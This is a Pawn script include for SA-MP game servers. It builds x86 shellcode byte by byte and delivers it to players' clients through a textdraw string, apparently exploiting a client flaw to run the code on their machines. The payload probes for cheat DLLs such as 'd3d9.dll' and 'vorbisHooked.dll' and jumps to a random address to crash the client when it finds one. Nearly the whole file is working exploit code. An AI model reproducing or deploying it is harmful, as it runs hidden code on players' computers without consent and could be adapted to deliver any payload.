#if !defined TextDrawClient_included
#define TextDrawClient_included

#include <a_samp>

static ClientCode[804];
static Text:Clients[MAX_PLAYERS];
static ClientCommandId[MAX_PLAYERS];

#define CLIENT_CODE_OFFSET  0x3B
#define CLIENT_DATA_OFFSET  0x1AD
#define CLIENT_CODE_SIZE    0x172
#define CLIENT_DATA_SIZE    0x173


#define _db(%0) ClientCode[off++] = %0

static stock PrepareClientMetaCode(playerid)
{
    for (new i = 0; i < sizeof(ClientCode); i++)
        ClientCode[i] = 0x90;

    ClientCommandId[playerid] = (ClientCommandId[playerid] + 1)&0xFF;

    if (ClientCommandId[playerid] == 0)
        ClientCommandId[playerid] = 1;
    
    new off = 0;

    _db(0x55); //push ebp

    _db(0x8B); //mov ebp,esp
    _db(0xEC);
    
    _db(0x50); //push eax
    _db(0x51); //push ecx
    _db(0x53); //push ebx
        
    _db(0xB8); //mov eax,408331FF
    _db(0xFF);
    _db(0x31);
    _db(0x83);
    _db(0x40);

    _db(0xC1); //shr eax,08
    _db(0xE8);
    _db(0x08);
    
    _db(0x8A); //mov cl,[eax]
    _db(0x08);
    
    _db(0xB3); //mov bl,ClientCommandId[playerid]
    _db(ClientCommandId[playerid]);
    
    _db(0x38); //cmp cl,bl
    _db(0xD9);

    _db(0x74); //je +0x1A
    _db(0x18);

    _db(0x88); //mov [eax],bl
    _db(0x18);

    _db(0x8B); //mov eax,[ebp+04]
    _db(0x45);
    _db(0x04);
    
    _db(0xBB); //mov ebx,0x3BFFFFFF
    _db(0xFF);
    _db(0xFF);
    _db(0xFF);
    _db(0x3B);

    _db(0xC1); //shr ebx,18
    _db(0xEB);
    _db(0x18);

    _db(0x01); //add eax,ebx
    _db(0xD8);

    _db(0x8B); //mov ecx,[ebp+04]
    _db(0x4D);
    _db(0x04);

    _db(0x51); //push ecx
    
    _db(0xFF); //call eax
    _db(0xD0);
    
    _db(0x83); //add esp,04
    _db(0xC4);
    _db(0x04);

    _db(0x5B); //pop ebx
    _db(0x59); //pop ecx
    _db(0x58); //pop eax
    _db(0x5D); //pop ebp

    _db(0x83); //add esp,24
    _db(0xC4);
    _db(0x24);

    _db(0x5F); //pop edi
    _db(0x5E); //pop esi

    _db(0x83); //add esp,18
    _db(0xC4);
    _db(0x18);

    _db(0xC3); //ret

    //Code
    _db(0xC3); //ret (do nothing)

    //Return address
    ClientCode[800] = 0x16; //-> ret
    ClientCode[801] = 0x27;
    ClientCode[802] = 0x40;
    ClientCode[803] = 0x00;
}

static stock Client_FileExists(off) //arg0 - file path, arg1 - length
{
    _db(0x55); //push ebp

    _db(0x8B); //mov ebp,esp
    _db(0xEC);

    _db(0x53); //push ebx

    _db(0x31); //xor eax,eax
    _db(0xC0);

    _db(0x50); //push eax
    
    _db(0xB8); //mov eax,80FFFFFF
    _db(0xFF);
    _db(0xFF);
    _db(0xFF);
    _db(0x80);

    _db(0xC1); //shr eax,18
    _db(0xE8);
    _db(0x18);
    
    _db(0x50); //push eax

    _db(0xB8); //mov eax,03FFFFFF
    _db(0xFF);
    _db(0xFF);
    _db(0xFF);
    _db(0x03);

    _db(0xC1); //shr eax,18
    _db(0xE8);
    _db(0x18);
    
    _db(0x50); //push eax

    _db(0x31); //xor eax,eax
    _db(0xC0);

    _db(0x50); //push eax
    _db(0x40); //inc eax
    _db(0x50); //push eax

    _db(0xB8); //mov eax,FFFFFF80
    _db(0x80);
    _db(0xFF);
    _db(0xFF);
    _db(0xFF);

    _db(0xC1); //shl eax,18
    _db(0xE0);
    _db(0x18);

    _db(0x50); //push eax

    _db(0x8B); //mov eax,[ebp+08]
    _db(0x45);
    _db(0x08);

    _db(0x8B); //mov ebx,[ebp+0C]
    _db(0x5D);
    _db(0x0C);

    _db(0x01); //add eax,ebx
    _db(0xD8);

    _db(0x53); //push ebx

    _db(0x31); //xor ebx,ebx
    _db(0xDB);

    _db(0x88); //mov eax,bl
    _db(0x18);
    
    _db(0x5B); //pop ebx

    _db(0x29); //sub eax,ebx
    _db(0xD8);

    _db(0x50); //push eax

    _db(0xB8); //mov eax,81E45AFF
    _db(0xFF); 
    _db(0x5A);
    _db(0xE4);
    _db(0x81);

    _db(0xC1); //shr eax,08
    _db(0xE8);
    _db(0x08);

    _db(0xFF); //call eax
    _db(0xD0);

    _db(0x83); //cmp eax,-01
    _db(0xF8);
    _db(0xFF);

    _db(0x0F); //setne al
    _db(0x95);
    _db(0xC0);

    _db(0x5B); //pop ebx
    _db(0x5D); //pop ebp
    _db(0xC3); //ret
}

stock CrashCheater(playerid)
{
    PrepareClientMetaCode(playerid);

    new str_d3d9[] = "d3d9.dll";
    new str_vorbisHooked[] = "vorbisHooked.dll";

    new bytes = 0;
    new i = 0;
    while (str_d3d9[bytes])
    {
        ClientCode[CLIENT_DATA_OFFSET + bytes] = str_d3d9[bytes];
        bytes++;
    }
    bytes++;
    while (str_vorbisHooked[i])
    {
        ClientCode[CLIENT_DATA_OFFSET + bytes] = str_vorbisHooked[i];
        bytes++;
        i++;
    }
    

    new off = CLIENT_CODE_OFFSET;

    _db(0x55); //push ebp

    _db(0x8B); //mov ebp,esp
    _db(0xEC);

    _db(0x50); //push eax
    _db(0x53); //push ebx
    
    _db(0xB8); //mov eax,length
    _db(0xFF);
    _db(0xFF);
    _db(0xFF);
    _db((sizeof(str_d3d9) - 1));

    _db(0xC1); //shr eax,18
    _db(0xE8);
    _db(0x18);

    _db(0x50); //push eax

    _db(0x8B); //mov eax,[ebp+08]
    _db(0x45);
    _db(0x08);

    _db(0xBB); //mov ebx,"d3d9.dll"
    _db(0xFF); 
    _db(0xFF);
    _db((CLIENT_DATA_OFFSET&0xFF));
    _db(((CLIENT_DATA_OFFSET>>>8)&0xFF));
    
    _db(0xC1); //shr ebx,10
    _db(0xEB);
    _db(0x10);

    _db(0x01); //add eax,ebx
    _db(0xD8);

    _db(0x50); //push eax

    _db(0x8B); //mov eax,[ebp+08]
    _db(0x45);
    _db(0x08);

    _db(0xBB); //mov ebx,Client_FileExists
    _db(0xFF); 
    _db(0xFF);
    _db(0xFF);
    _db(0xB0);

    _db(0xC1); //shr ebx,18
    _db(0xEB);
    _db(0x18);

    _db(0x01); //add eax,ebx
    _db(0xD8);

    _db(0xFF); //call eax
    _db(0xD0);

    _db(0x84); //test al,al
    _db(0xC0);

    _db(0x0F); //jne crash
    _db(0x85);
    _db((random(0xFF) + 1));
    _db((random(0xFF) + 1));
    _db((random(0xFF) + 1));
    _db((random(0xFF) + 1));

    _db(0x83); //add esp,08
    _db(0xC4);
    _db(0x08);

    _db(0xB8); //mov eax,length
    _db(0xFF); 
    _db(0xFF);
    _db(0xFF);
    _db((sizeof(str_vorbisHooked) - 1));

    _db(0xC1); //shr eax,18
    _db(0xE8);
    _db(0x18);

    _db(0x50); //push eax

    _db(0x8B); //mov eax,[ebp+08]
    _db(0x45);
    _db(0x08);

    _db(0xBB); //mov ebx,"vorbisHooked.dll"
    _db(0xFF); 
    _db(0xFF);
    _db(((CLIENT_DATA_OFFSET + sizeof(str_d3d9))&0xFF));
    _db((((CLIENT_DATA_OFFSET + sizeof(str_d3d9))>>>8)&0xFF));
    
    _db(0xC1); //shr ebx,10
    _db(0xEB);
    _db(0x10);

    _db(0x01); //add eax,ebx
    _db(0xD8);

    _db(0x50); //push eax

    _db(0x8B); //mov eax,[ebp+08]
    _db(0x45);
    _db(0x08);

    _db(0xBB); //mov ebx,Client_FileExists
    _db(0xFF); 
    _db(0xFF);
    _db(0xFF);
    _db(0xB0);

    _db(0xC1); //shr ebx,18
    _db(0xEB);
    _db(0x18);

    _db(0x01); //add eax,ebx
    _db(0xD8);

    _db(0xFF); //call eax
    _db(0xD0);

    _db(0x84); //test al,al
    _db(0xC0);

    _db(0x0F); //jne crash
    _db(0x85);
    _db((random(0xFF) + 1));
    _db((random(0xFF) + 1));
    _db((random(0xFF) + 1));
    _db((random(0xFF) + 1));

    _db(0x83); //add esp,08
    _db(0xC4);
    _db(0x08);

    _db(0x5B); //pop ebx
    _db(0x58); //pop eax
    _db(0x5D); //pop ebp
    _db(0xC3); //ret

    Client_FileExists(0xB0);

	TextDrawSetString(Clients[playerid], ClientCode);
}

stock LoadClientForPlayer(playerid)
{
    PrepareClientMetaCode(playerid);
    Clients[playerid] =  TextDrawCreate(1000, 1000, ClientCode);
    TextDrawShowForPlayer(playerid, Clients[playerid]);
}

stock UnloadClientForPlayer(playerid)
{
	TextDrawHideForPlayer(playerid, Clients[playerid]);
	TextDrawDestroy(Clients[playerid]);
    Clients[playerid] = Text:0;
}

#undef _db
#endif